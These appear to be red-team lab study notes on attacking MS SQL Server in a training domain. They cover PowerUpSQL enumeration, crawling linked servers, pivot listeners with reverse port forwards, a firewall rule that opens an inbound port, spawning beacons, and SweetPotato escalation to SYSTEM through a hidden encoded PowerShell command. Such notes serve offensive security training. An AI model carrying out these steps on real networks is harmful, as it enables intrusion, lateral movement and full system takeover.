# Use PowerUpSQL, but before.. import it! 
```powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1```

Find MS SQL Servers
```powershell Get-SQLInstanceDomain```
It works by searching for SPNs that begin with MSSQL*.
You may also search the domain for groups that sound like they may have access to database instances (for example, a "SQL Admins" group).

Test whether or not we can connect to the database
```powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433"```
:triangular_flag_on_post: Try both with simple user and SYSTEM. It could give different results! 

Get more information about the instance
```powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"```
:triangular_flag_on_post:  If there are multiple SQL Servers available, you can chain these commands together to automate the data collection.
```powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo```

There are several options for issuing queries against a SQL instance.  
- Get-SQLQuery from PowerUpSQL ```powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"```
- Using msqlclient.py. For this you will need to use proxichain and start SOCKS on the beacon **as SYSTEM**
- Windows GUI for sql via proxifier.

The idea here is to move from the workstation you exploited to an SQL instance. You should be both simple user and a SYSTEM user in order to be able to apply firewall rules.
This is because there is a SQL command length limit that will prevent you from sending large payloads directly in the query. Since the SQL server also cannot reach the team server directly, a reverse port forward can be used to deliver it.
The rev port forward require to open the port on the firewall and only SYSTEM users can do this. 

Starting from being the simple user, create a **pivot listner**. Just use a port you are sure is not already used and leave all the rest as it is.
When you'll encode the payload that need to be linked to the pivot listner just created, you'll need to change the port to 8080 and the IP should be the one of the workstation. (wkstn-2 in our case)
As System we'll need do the reverse port forward with ```rportfwd 8080 127.0.0.1 80``` and create the right rule in the firewall ```powershell New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080```

This will spawn a beacon on the SQL system. 

From there we can see if this system is linked to another. 
```powershell Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"```
Let's say we are in a SQL instance 2 and we see it is linked to another SQL instance 1. To execute a shell command on SQL-1 we we'll need to recreate the chain used previously. 
Starting from being the SQL user on SQL 2, create a **pivot listner**. Just use a port you are sure is not already used and leave all the rest as it is.
When you'll encode the payload it needs to be linked to the pivot listner just created, you'll need to change the port to 8080 and the IP should be the one of the SQL 2.
We'll need to do the reverse port forward with ```rportfwd 8080 127.0.0.1 80``` and this will spawn a beacon on the SQL 1 system. 

In this way I will probably become simple user on SQL 1 system since we cannot be a local admin directly. In order to escalate privileges and become SYSTEM a strategy is to force a SYSTEM service to authenticate to a rogue service that the attacker creates.  This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.

For this we can use SweetPotato
SweetPotato has a collection of these various techniques which can be executed via Beacon's execute-assembly command.

```execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc <encoded command>"
The listener you need to create is a TCP listener bind to localhost on a port that is free at the moment. When you encode the web delivery, it should point to the system itself (SQL 1) and port must be 8080 since we are still exploiting the rev portforward.

